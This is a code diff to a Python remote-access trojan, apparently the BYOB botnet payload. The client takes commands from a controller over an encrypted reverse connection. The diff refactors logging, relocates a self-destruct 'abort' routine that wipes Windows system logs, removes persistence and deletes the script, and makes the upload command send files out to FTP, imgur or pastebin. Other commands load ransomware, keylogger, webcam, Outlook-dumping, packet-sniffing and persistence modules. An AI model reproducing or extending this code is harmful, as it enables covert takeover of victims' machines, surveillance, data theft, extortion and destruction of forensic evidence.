@@ -26,9 +26,10 @@ import contextlib
 import collections
 import logging.handlers
 
-# globals
-logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
-__logger__ = logging.getLogger(__name__)
+def log(info, level='debug'):
+    logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
+    logger = logging.getLogger(__name__)
+    getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))
 
 def config(*arg, **options):
     """ 
@@ -95,12 +96,6 @@ class Payload():
             return getattr(self, cmd)
         return False
 
-    def _get_logger(self, host, port):
-        logger  = logging.getLogger(self.info.get('uid'))
-        logger.addHandler(logging.handlers.SocketHandler(host, port + 1))
-        logger.setLevel(logging.DEBUG if '--debug' in sys.argv else logging.ERROR)
-        return logger
-
     def _get_connection(self, host, port):
         if not ipv4(host):
             raise ValueError('invalid IPv4 address')
@@ -128,7 +123,7 @@ class Payload():
             try:
                 info[function] = globals()[function]()
             except Exception as e:
-                __logger__.info("'{}' from session info returned error: {}".format(function, str(e)))
+                log(level='info', info= "'{}' from session info returned error: {}".format(function, str(e)))
         data = globals()['encrypt_aes'](json.dumps(info), self.key)
         msg = struct.pack('!L', len(data)) + data
         self.connection.sendall(msg)
@@ -142,7 +137,7 @@ class Payload():
             raise TypeError("keyword argument 'base_url' must be type '{}'".format(str))
         if not base_url.startswith('http'):
             raise ValueError("keyword argument 'base_url' must start with http:// or https://")
-        __logger__.info('[*] Searching %s' % base_url)
+        log(level='info', info= '[*] Searching %s' % base_url)
         path  = urllib2.urlparse.urlsplit(base_url).path
         base  = path.strip('/').replace('/','.')
         names = [line.rpartition('</a>')[0].rpartition('>')[2].strip('/') for line in urllib2.urlopen(base_url).read().splitlines() if 'href' in line if '</a>' in line if '__init__.py' not in line]
@@ -151,7 +146,7 @@ class Payload():
             if ext in ('.py','.pyc'):
                 module = '.'.join((base, name)) if base else name
                 if module not in target:
-                    __logger__.info("[+] Adding %s" % module)
+                    log(level='info', info= "[+] Adding %s" % module)
                     target.append(module)
             elif not len(ext):
                 t = threading.Thread(target=self._get_resources, kwargs={'target': target, 'base_url': '/'.join((base_url, n))})
@@ -180,7 +175,7 @@ class Payload():
                 if globals()['_abort']:
                     break
             except Exception as e:
-                __logger__.error(e)
+                log(level='error', info=e)
                 break
 
     @threaded
@@ -241,8 +236,7 @@ class Payload():
         output = []
         if not os.path.isfile(path):
             return "Error: file not found"
-        for line in open(path, 'rb').readlines():
-            line = line.rstrip()
+        for line in open(path, 'rb').read().splitlines():
             if len(line) and not line.isspace():
                 if len('\n'.join(output + [line])) < 48000:
                     output.append(line)
@@ -259,10 +253,10 @@ class Payload():
         :param str source:    data or filename to upload
 
         `Optional`
-        :param str filetype:  upload file type          (default: .txt)
-        :param str host:      FTP server hostname       
-        :param str user:      FTP server login user     
-        :param str password:  FTP server login password 
+        :param str filetype:  upload file type
+        :param str host:      FTP server hostname
+        :param str user:      FTP server login user
+        :param str password:  FTP server login password
 
         """
         try:
@@ -336,7 +330,7 @@ class Payload():
                 path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                 return path
             except Exception as e:
-                __logger__.error("{} error: {}".format(self.wget.func_name, str(e)))
+                log(level='error', info="{} error: {}".format(self.wget.func_name, str(e)))
         else:
             return "Invalid target URL - must begin with 'http'"
 
@@ -354,9 +348,9 @@ class Payload():
                 try:
                     self.stop(thread)
                 except Exception as e:
-                    __logger__.error("{} error: {}".format(self.kill.func_name, str(e)))
+                    log(level='error', info="{} error: {}".format(self.kill.func_name, str(e)))
         except Exception as e:
-            __logger__.error("{} error: {}".format(self.kill.func_name, str(e)))
+            log(level='error', info="{} error: {}".format(self.kill.func_name, str(e)))
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='help')
     def help(self, name=None):
@@ -371,39 +365,14 @@ class Payload():
             try:
                 return help(self)
             except Exception as e:
-                __logger__.error("{} error: {}".format(self.help.func_name, str(e)))
+                log(level='error', info="{} error: {}".format(self.help.func_name, str(e)))
         elif hasattr(self, name):
             try:
                 return help(getattr(self, name))
             except Exception as e:
-                __logger__.error("{} error: {}".format(self.help.func_name, str(e)))
+                log(level='error', info="{} error: {}".format(self.help.func_name, str(e)))
         else:
             return "'{}' is not a valid command and is not a valid module".format(name)
-
-    @config(platforms=['win32','linux','darwin'], command=True, usage='mode <active/passive>')
-    def mode(self, shell_mode):
-        """ 
-        Set mode of reverse TCP shell
-
-        `Requires`
-        :param str mode:     active, passive
-
-        `Returns`
-        :param str status:   shell mode status update
-
-        """
-        try:
-            if str(arg) == 'passive':
-                self.flags.passive.set()
-                return "Mode: passive"
-            elif str(arg) == 'active':
-                self.flags.passive.clear()
-                return "Mode: active"
-            else:
-                return "Mode: passive" if self.flags.passive.is_set() else "Mode: active"
-        except Exception as e:
-            __logger__.error(e)
-        return self.mode.usage
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='load <module> [target]')
     def load(self, args):
@@ -426,35 +395,11 @@ class Payload():
             with globals()['remote_repo'](self.remote['packages'], base_url_2):
                 try:
                     globals()['imports'](module, target)
+                    return ' '.join(('[+] {} remotely imported'.format(module), 'into {}'.format(target)))
                 except Exception as e:
-                    return "{} error: {}".format(self.load.func_name, str(e))
+                    log(level='error', info="{} error: {}".format(self.load.func_name, str(e)))
+                    return ' '.join(('[-] {} could not be remotely imported'.format(module), 'into {}'.format(target)))
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
-    def abort(self):
-        """ 
-        Abort tasks, close connection, and self-destruct leaving no trace on the disk
-
-        """
-        globals()['_abort'] = True
-        try:
-            if os.name is 'nt':
-                clear_system_logs()
-            if 'persistence' in globals():
-                for method in persistence.methods:
-                    if persistence.methods[method].get('established'):
-                        try:
-                            remove = getattr(persistence, 'remove_{}'.format(method))()
-                        except Exception as e2:
-                            __logger__.error("{} error: {}".format(method, str(e2)))
-            if not _debug:
-                delete(sys.argv[0])
-        finally:
-            shutdown = threading.Thread(target=self.get_shutdown)
-            taskkill = threading.Thread(target=self.ps, args=('kill python',))
-            shutdown.start()
-            taskkill.start()
-            sys.exit()
- 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
     def stop(self, target):
         """ 
@@ -471,7 +416,7 @@ class Payload():
             else:
                 return "Job '{}' not found".format(target)
         except Exception as e:
-            __logger__.error("{} error: {}".format(self.stop.func_name, str(e)))
+            log(level='error', info="{} error: {}".format(self.stop.func_name, str(e)))
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
     def show(self, attribute):
@@ -508,7 +453,33 @@ class Payload():
             else:
                 return self.show.usage
         except Exception as e:
-            __logger__.error("'{}' error: {}".format(_threads.func_name, str(e)))
+            log(level='error', info="'{}' error: {}".format(_threads.func_name, str(e)))
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
+    def abort(self, *args):
+        """ 
+        Abort tasks, close connection, and self-destruct leaving no trace on the disk
+
+        """
+        globals()['_abort'] = True
+        try:
+            if os.name is 'nt':
+                clear_system_logs()
+            if 'persistence' in globals():
+                for method in persistence.methods:
+                    if persistence.methods[method].get('established'):
+                        try:
+                            remove = getattr(persistence, 'remove_{}'.format(method))()
+                        except Exception as e2:
+                            log(level='error', info="{} error: {}".format(method, str(e2)))
+            if not _debug:
+                delete(sys.argv[0])
+        finally:
+            shutdown = threading.Thread(target=self.get_shutdown)
+            taskkill = threading.Thread(target=self.ps, args=('kill python',))
+            shutdown.start()
+            taskkill.start()
+            sys.exit()
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
     def unzip(self, path):
@@ -524,7 +495,7 @@ class Payload():
                 _ = zipfile.ZipFile(path).extractall('.')
                 return os.path.splitext(path)[0]
             except Exception as e:
-                __logger__.error("{} error: {}".format(self.unzip.func_name, str(e)))
+                log(level='error', info="{} error: {}".format(self.unzip.func_name, str(e)))
         else:
             return "File '{}' not found".format(path)
 
@@ -544,7 +515,7 @@ class Payload():
 
         """
         if 'phone' not in globals():
-            phone = globals()['load']('phone')
+            phone = self.load('phone')
         mode, _, args = str(args).partition(' ')
         if 'text' in mode:
             phone_number, _, message = args.partition(' ')
@@ -591,11 +562,12 @@ class Payload():
             if not source:
                 return self.upload.usage + ' -  mode: ftp, imgur, pastebin'
             elif mode not in ('ftp','imgur','pastebin'):
-                return self.upload.usage + ' - mode: ftp, imgur, pastebin'
-            else:
                 return "{} error: invalid mode '{}'".format(self.upload.func_name, str(mode))
+            else:
+                return getattr(self, mode)(source)
         except Exception as e:
-            __logger__.error("{} error: {}".format(self.upload.func_name, str(e)))
+            log(level='error', info="{} error: {}".format(self.upload.func_name, str(e)))
+            return "Error: {}".format(str(e))
 
     @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\BYOB", command=True, usage='ransom <mode> [path]')
     def ransom(self, args):
@@ -608,7 +580,7 @@ class Payload():
 
         """
         if 'ransom' not in globals():
-            ransom = globals()['load']('ransom')
+            ransom = self.load('ransom')
         if not args:
             return self.ransom.usage
         cmd, _, action = str(args).partition(' ')
@@ -640,7 +612,7 @@ class Payload():
         """
         try:
             if 'webcam' not in globals():
-                webcam = globals()['load']('webcam')
+                webcam = self.load('webcam')
             elif not args:
                 result = self.webcam.usage
             else:
@@ -665,12 +637,12 @@ class Payload():
 
         """
         try:
-            __logger__.error("{} failed - restarting in 3 seconds...".format(output))
+            log(level='error', info="{} failed - restarting in 3 seconds...".format(output))
             self.kill()
             time.sleep(3)
             os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
         except Exception as e:
-            __logger__.error("{} error: {}".format(self.restart.func_name, str(e)))
+            log(level='error', info="{} error: {}".format(self.restart.func_name, str(e)))
 
     @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
     def outlook(self, args=None):
@@ -685,7 +657,7 @@ class Payload():
 
         """
         if 'outlook' not in globals():
-            outlook = globals()['load']('outlook')
+            outlook = self.load('outlook')
         elif not args:
             try:
                 if not outlook.installed():
@@ -709,7 +681,7 @@ class Payload():
                 else:
                     return "usage: outlook [mode]\n    mode: count, dump, search, results"
             except Exception as e:
-                __logger__.error("{} error: {}".format(self.email.func_name, str(e)))
+                log(level='error', info="{} error: {}".format(self.email.func_name, str(e)))
 
     @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
     def execute(self, args):
@@ -738,7 +710,7 @@ class Payload():
                     self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                     return "Running '{}' in a new process".format(name)
                 except Exception as e:
-                    __logger__.error("{} error: {}".format(self.execute.func_name, str(e)))
+                    log(level='error', info="{} error: {}".format(self.execute.func_name, str(e)))
         else:
             return "File '{}' not found".format(str(path))
 
@@ -756,7 +728,7 @@ class Payload():
         """
         try:
             if 'process' not in globals():
-                process = globals()['load']('process')
+                process = self.load('process')
             if not args:
                 if hasattr(process, 'usage'):
                     return process.usage
@@ -770,7 +742,7 @@ class Payload():
             else:
                 return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
         except Exception as e:
-            __logger__.error("{} error: {}".format(self.process.func_name, str(e)))
+            log(level='error', info="{} error: {}".format(self.process.func_name, str(e)))
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <mode> <target>')
     def portscan(self, args=None):
@@ -784,7 +756,7 @@ class Payload():
         
         """
         if 'portscan' not in globals():
-            portscan = globals()['load']('portscan')
+            portscan = self.load('portscan')
         try:
             if not args:
                 return 'portscan <mode> <target>'
@@ -801,7 +773,7 @@ class Payload():
             else:
                 return "Error: invalid mode '%s'" % mode
         except Exception as e:
-            __logger__.error("{} error: {}".format(self.portscan.func_name, str(e)))
+            log(level='error', info="{} error: {}".format(self.portscan.func_name, str(e)))
 
     def pastebin(self, source, api_key=None):
         """ 
@@ -847,9 +819,9 @@ class Payload():
                 length  = keylogger._buffer.tell()
                 return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(func_name, mode, update, length)
             except Exception as e:
-                __logger__.error("{} error: {}".format('keylogger.status', str(e)))
+                log(level='error', info="{} error: {}".format('keylogger.status', str(e)))
         if 'keylogger' not in globals():
-            keylogger = globals()['load']('keylogger')
+            keylogger = self.load('keylogger')
         elif not mode:
             if 'keylogger' not in self.handlers:
                 return keylogger.usage
@@ -893,13 +865,13 @@ class Payload():
         """
         try:
             if 'screenshot' not in globals():
-                screenshot = globals()['load']('screenshot')
+                screenshot = self.load('screenshot')
             elif not mode in ('ftp','imgur'):
                 return "Error: invalid mode '%s'" % str(mode)
             else:
                 return screenshot.screenshot(mode)
         except Exception as e:
-            __logger__.error("{} error: {}".format(self.screenshot.func_name, str(e)))
+            log(level='error', info="{} error: {}".format(self.screenshot.func_name, str(e)))
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence add/remove [method]')
     def persistence(self, args=None):
@@ -922,7 +894,7 @@ class Payload():
         """
         try:
             if not 'persistence' in globals():
-                persistence = globals()['load']('persistence')
+                persistence = self.load('persistence')
             cmd, _, action = str(args).partition(' ')
             if cmd not in ('add','remove'):
                 return self.persistence.usage + str('\nmethods: %s' % ', '.join(persistence.methods()))
@@ -931,7 +903,7 @@ class Payload():
                     persistence.methods[method].established, persistence.methods[method].result = persistence.methods[method].add()
             return json.dumps(persistence.results())
         except Exception as e:
-            __logger__.error("{} error: {}".format(self.persistence.func_name, str(e)))
+            log(level='error', info="{} error: {}".format(self.persistence.func_name, str(e)))
         return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in persistence.methods if sys.platform in getattr(shell, '_persistence_add_%s' % m).platforms]))
 
     @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer mode=[str] time=[int]')
@@ -946,7 +918,7 @@ class Payload():
         """
         try:
             if 'packetsniffer' not in globals():
-                packetsniffer = globals()['load']('packetsniffer')
+                packetsniffer = self.load('packetsniffer')
             mode = None
             length = None
             cmd, _, action = str(args).partition(' ')
@@ -958,7 +930,7 @@ class Payload():
             self.handlers['packetsniffer'] = packetsniffer(mode, seconds=length)
             return 'Capturing network traffic for {} seconds'.format(duration)
         except Exception as e:
-            __logger__.error("{} error: {}".format(self.packetsniffer.func_name, str(e)))
+            log(level='error', info="{} error: {}".format(self.packetsniffer.func_name, str(e)))
 
     def send_task(self, task):
         """ 
@@ -1025,12 +997,12 @@ class Payload():
                                 result = bytes(command(action) if action else command()) if command else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                             except Exception as e:
                                 result = "{} error: {}".format(self.run.func_name, str(e))
-                                __logger__.debug(result)
+                                log(level='debug', info=result)
                             task.update({'result': result})
                             self.send_task(task)
                         self.flags.prompt.set()
                 else:
-                    __logger__.error("Connection timed out")
+                    log(level='error', info="Connection timed out")
                     break
         except Exception as e:
-            __logger__.error("{} error: {}".format(self.run.func_name, str(e)))
+            log(level='error', info="{} error: {}".format(self.run.func_name, str(e)))
